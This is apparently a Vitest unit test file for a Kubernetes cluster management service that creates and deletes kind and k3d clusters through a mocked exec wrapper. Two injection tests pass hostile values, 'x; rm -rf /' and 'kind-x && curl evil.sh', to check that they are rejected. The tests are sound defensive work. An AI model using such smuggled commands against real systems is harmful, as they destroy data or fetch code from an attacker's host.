import { describe, it, expect, vi, beforeEach } from 'vitest';
import { ClusterManagementService } from '../services/cluster/cluster-management-service';
import { safeExec } from '../utils/safe-exec';

vi.mock('../utils/safe-exec', () => ({
  safeExec: vi.fn(),
  ALLOWED_TOOLS: new Set(['kubectl', 'kind', 'k3d']),
}));

vi.mock('../services/plugins/plugin-events', () => ({
  pluginEventBus: {
    emitClusterConnected: vi.fn(),
    emitClusterDisconnected: vi.fn(),
  },
}));

const mockSafeExec = vi.mocked(safeExec);

/** All safeExec calls as "tool arg1 arg2…" strings, for readable asserts. */
function calledCommands(): string[] {
  return mockSafeExec.mock.calls.map(
    ([tool, args]) => `${tool} ${(args as string[]).join(' ')}`
  );
}

describe('ClusterManagementService', () => {
  let service: ClusterManagementService;

  beforeEach(() => {
    vi.clearAllMocks();
    service = new ClusterManagementService();
    // Default success for exec
    mockSafeExec.mockResolvedValue({ stdout: '', stderr: '' });
  });

  describe('createCluster', () => {
    it('should create a kind cluster successfully', async () => {
      const result = await service.createCluster('test-cluster', 'kind');

      expect(mockSafeExec).toHaveBeenCalledWith('kind', [
        'create',
        'cluster',
        '--name',
        'test-cluster',
      ]);
      expect(result).toEqual({ success: true });
    });

    it('should create a k3d cluster successfully', async () => {
      const result = await service.createCluster('test-cluster', 'k3d');

      expect(mockSafeExec).toHaveBeenCalledWith('k3d', [
        'cluster',
        'create',
        'test-cluster',
      ]);
      expect(result).toEqual({ success: true });
    });

    it('should handle creation errors', async () => {
      mockSafeExec.mockRejectedValue(new Error('Creation failed'));

      const result = await service.createCluster('test-cluster', 'kind');

      expect(result).toEqual({ success: false, error: 'Creation failed' });
    });

    it('should reject invalid cluster names (injection attempt)', async () => {
      const result = await service.createCluster('x; rm -rf /', 'kind');

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid cluster name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject unknown providers', async () => {
      const result = await service.createCluster(
        'test-cluster',
        'evil' as 'kind'
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid provider');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('deleteCluster', () => {
    it('should delete a kind cluster and verify context removal', async () => {
      let getContextsCallCount = 0;
      mockSafeExec.mockImplementation(async (tool, args) => {
        const cmd = `${tool} ${(args as string[]).join(' ')}`;
        if (cmd === 'kubectl config get-contexts -o name') {
          getContextsCallCount++;
          if (getContextsCallCount === 1) {
            // First check: context exists
            return { stdout: 'kind-test-cluster\nother-context', stderr: '' };
          }
          // Verification: context gone
          return { stdout: 'other-context', stderr: '' };
        }
        return { stdout: '', stderr: '' };
      });

      const result = await service.deleteCluster('kind-test-cluster');

      expect(calledCommands()).toContain(
        'kind delete cluster --name test-cluster'
      );
      expect(calledCommands()).toContain(
        'kubectl config delete-context kind-test-cluster'
      );
      expect(result).toEqual({ success: true });
    });

    it('should handle deletion errors and return failure', async () => {
      mockSafeExec.mockImplementation(async (tool) => {
        if (tool === 'kind') {
          throw new Error('Cluster not found');
        }
        return { stdout: '', stderr: '' };
      });

      const result = await service.deleteCluster('kind-test-cluster');

      expect(calledCommands()).toContain(
        'kind delete cluster --name test-cluster'
      );
      expect(result.success).toBe(false);
      expect(result.error).toContain('Cluster not found');
    });

    it('should handle context check errors without failing the whole process', async () => {
      let contextCalls = 0;
      mockSafeExec.mockImplementation(async (tool, args) => {
        const cmd = `${tool} ${(args as string[]).join(' ')}`;
        if (cmd.includes('config get-contexts')) {
          contextCalls++;
          if (contextCalls === 1) {
            throw new Error('Kubeconfig error');
          }
          return { stdout: '', stderr: '' }; // final verification succeeds
        }
        return { stdout: '', stderr: '' };
      });

      const result = await service.deleteCluster('kind-test-cluster');

      // Should still return success if the main deletion succeeded
      expect(result.success).toBe(true);
    });

    it('should delete a k3d cluster', async () => {
      const result = await service.deleteCluster('k3d-test');

      expect(calledCommands()).toContain('k3d cluster delete test');
      expect(result.success).toBe(true);
    });

    it.each([
      ['kind', 'kind delete cluster --name kind'],
      ['k3d', 'k3d cluster delete k3d'],
    ])(
      'should delete a cluster whose context is just "%s"',
      async (context, command) => {
        const result = await service.deleteCluster(`  ${context}  `);

        expect(calledCommands()[0]).toBe(command);
        expect(result.success).toBe(true);
      }
    );

    it('should handle non-kind/k3d contexts', async () => {
      const result = await service.deleteCluster('some-other-context');

      const commands = calledCommands();
      expect(commands.some((c) => c.startsWith('kind delete'))).toBe(false);
      expect(commands.some((c) => c.startsWith('k3d cluster delete'))).toBe(
        false
      );
      // But should have checked context
      expect(commands).toContain('kubectl config get-contexts -o name');
      expect(result.success).toBe(true);
    });

    it('should reject invalid context names (injection attempt)', async () => {
      const result = await service.deleteCluster('kind-x && curl evil.sh');

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid context name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });
});
